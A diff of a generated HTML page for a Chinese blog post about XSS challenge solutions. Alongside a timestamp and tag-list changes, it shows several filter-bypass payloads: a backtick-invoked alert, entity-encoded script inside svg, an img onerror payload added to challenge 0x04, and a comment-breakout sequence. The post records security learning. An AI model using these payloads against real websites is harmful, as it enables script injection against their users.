@@ -17,7 +17,7 @@
 <meta property="og:description" content="记录和总结XSS攻击学习过程。">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;wchhlbt&#x2F;MyPostImg&#x2F;master&#x2F;xss-successful.png">
-<meta property="og:updated_time" content="2020-10-11T05:28:45.071Z">
+<meta property="og:updated_time" content="2021-07-02T08:22:08.006Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;wchhlbt&#x2F;MyPostImg&#x2F;master&#x2F;xss-successful.png">
   
@@ -206,7 +206,7 @@
 
 <h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 题目中用正则表达式过滤了（），但是可以采用反引号`绕过</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Payload:</span><br><span class="line">&lt;script&gt;alert<span class="string">`1`</span>&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 题目中用正则表达式过滤了（）和反引号，使用svg标签，&lt;svg&gt;标签中可以直接执行实体字符。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Payload:</span><br><span class="line">&lt;svg&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert&amp;#40;1&amp;#41;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 题目中用正则表达式过滤了（）和反引号，使用svg标签，&lt;svg&gt;标签中可以直接执行实体字符。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Payload1:</span><br><span class="line">&lt;svg&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert&amp;#40;1&amp;#41;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"># Payload2:</span><br><span class="line">&lt;img src=1 onerror=alert&amp;#40;1&amp;#41;&gt;</span><br></pre></td></tr></table></figure>
 
 <h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 题目中用正则表达式过滤了--&gt;。</span></span><br><span class="line"><span class="comment">// html注释支持以下两种方式：</span></span><br><span class="line"><span class="comment">// &lt;!-- xxx --&gt;</span></span><br><span class="line"><span class="comment">// &lt;!- xxx -!&gt; &lt;!— 以！开头，以！结尾对称注释的方式 —!&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">'😂'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Payload:</span><br><span class="line">--!&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="xml"><span class="comment">&lt;!--</span></span></span><br></pre></td></tr></table></figure>
 
@@ -533,19 +533,19 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">网络安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">algorithm</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">CTF</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">折腾</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">网络安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">algorithm</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -562,6 +562,10 @@ MathJax.Hub.Queue(function() {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color1">CTF, Web, Buuoj</a>
               </li>
             
             <div class="clearfix"></div>
